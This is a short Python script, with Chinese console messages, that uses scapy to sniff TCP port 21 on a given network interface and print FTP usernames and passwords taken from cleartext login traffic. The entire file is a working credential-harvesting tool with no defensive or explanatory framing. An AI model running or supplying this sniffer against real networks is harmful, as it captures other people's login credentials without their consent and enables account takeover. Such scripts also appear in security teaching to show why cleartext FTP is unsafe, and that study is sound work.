#!/usr/bin/python
# -*- coding: utf-8 -*-

import optparse
import re
from scapy.all import *

def ftpSniff(pkt):
    
    dest = pkt.getlayer('IP').dst
    raw = pkt.sprintf('%Raw.load%')
    user = re.findall('(?i)USER (.*)', raw)
    pswd = re.findall('(?i)PASS (.*)', raw)
    
    if user:
        print(' [*] 嗅探到FTP登录数据' + str(dest))
        print(' [+] 用户名: ' + str(user[0]).replace("\\r\\n",""))
    elif pswd:
        print(' [+] 账号密码: ' + str(pswd[0]).replace("\\r\\n",""))

def main():
    parser = optparse.OptionParser('usage '+'-i<interface>')
    parser.add_option('-i', dest='interface', \
type='string', help='网卡要切换到监听模式')
    (options, args) = parser.parse_args()
    
    if options.interface == None:
        print(parser.usage)
        exit(0)
    else:
        conf.iface = options.interface
    
    try:
        print(" [=] 嗅探FTP登录数据中... ")
        sniff(filter='tcp port 21', prn=ftpSniff)
    except KeyboardInterrupt:
        exit(0)


if __name__ == '__main__':
    main()
